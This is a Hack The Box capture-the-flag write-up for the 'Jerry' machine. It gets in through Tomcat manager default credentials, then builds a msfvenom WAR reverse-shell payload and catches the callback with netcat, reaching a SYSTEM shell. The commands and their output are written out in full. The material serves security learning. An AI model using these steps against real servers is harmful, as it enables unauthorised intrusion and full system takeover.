# Jerry-HTB
Jerry is a Windows machine that is rated as easy. This box is running Apache Tomcat and its configured with weak credentials.
# Recon
We first start by runing nmap scan on the machine.
```
root@kali:~/Desktop# nmap -sC -sV 10.10.10.95
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 11:43 EDT
Nmap scan report for 10.10.10.95
Host is up (0.028s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
```
If we go to ```/manager``` we can see that we need to login, so I tried some of Tomcat default credentials and I was able to login using this ```tomcat:s3cret```.

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Jerry/images/1.png)

We can upload a WAR file and get a reverse shell:

![image2](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Jerry/images/2.png)

# Flags
First let's generate the WAR file:
```
root@kali:~/Desktop# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=4444 -f war > shell.war
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of war file: 52213 bytes
```
And now we only need to find what is the jsp page so we can run the reverse shell:
```
root@kali:~/Desktop# jar -ft shell.war 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
META-INF/
META-INF/MANIFEST.MF
WEB-INF/
WEB-INF/web.xml
bitkpnkilma.jsp
```
So it's located at ```bitkpnkilma.jsp```. If we go to http://10.10.10.95:8080/shell/bitkpnkilma.jsp . You should get your reverse shell:
```
root@kali:~/Desktop# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```
User and Root Flag:
```
C:\Users\Administrator\Desktop\flags>type 2*
type 2*

2 for the price of 1.txt


user.txt
7004dbce...875f26ebd00

root.txt
04a8b36e1...67e772fe90e
```
Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
